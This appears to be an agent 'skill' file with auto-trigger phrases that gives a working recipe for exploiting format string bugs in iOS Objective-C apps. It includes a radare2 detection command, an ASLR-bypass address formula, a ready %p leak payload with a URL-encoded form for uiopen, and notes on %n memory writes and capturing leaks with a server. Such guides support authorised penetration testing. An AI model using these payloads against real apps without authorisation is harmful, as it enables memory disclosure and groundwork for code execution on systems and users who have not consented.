---
name: ios-format-string-aslr-leak
description: Use when an iOS Objective-C app passes user-controlled input directly to stringWithFormat:, enabling format string exploitation. Leaks stack pointers with %p to bypass ASLR. Triggers - "format string iOS", "stringWithFormat", "ASLR leak", "%p leak", "format string vulnerability"
platform: [ios]
stack: [native]
category: vectors-misc
tier: B
related: []
---

# Skill: iOS Format String → ASLR Leak

## When to use
An iOS/Objective-C app that calls `[NSString stringWithFormat:userInput]` where the user
controls the format. Allows leaking stack pointers to bypass ASLR.

## Static detection
- Search for `stringWithFormat:` in the binary:
  ```
  r2 -c "aaa; axt @ sym._objc_msgSend_stringWithFormat:" brokelesnor
  ```
- Verify whether arg `x2` (the format) comes from user input and not from a literal:
  - In `processUserInput:`: `mov x2, x19` where `x19` = input → VULN
  - In `openURLContexts:`: `add x2, x2, 0x390` (literal `"%@/?leak=%@"`) → NOT vuln

## Exploitation
1. Identify a code pointer on the stack (return address, saved register)
2. Count the position of the format string arg: `leak[0]` = first `%p`, `leak[7]` = eighth
3. Compute the code pointer's offset within the binary:
   ```
   leaked_ptr = leak[N]
   offset_in_binary = leaked_ptr - module_base  # get the base with Frida first
   ```
4. ASLR bypass formula:
   ```
   runtime_base = leaked_ptr - offset_in_binary
   target_addr = runtime_base + target_offset
   ```

## Payload
```
coupon=%p.%p.%p.%p.%p.%p.%p.%p
```
URL-encoded for `uiopen`: `%25p.%25p.%25p.%25p.%25p.%25p.%25p.%25p`

## Notes
- On ARM64, the first 8 varargs of `stringWithFormat:` go in `x2`-`x9`, then the stack
- `%p` prints `0x...` hex; `$p` (positional) also works to jump to high offsets
- To write memory: `%n` (write count), `%hn` (half), `%hhn` (byte): requires
  aligning the target address on the stack with `%Xc` padding
- If the app makes an HTTP request with the format string output, stand up a server to
  capture the leak
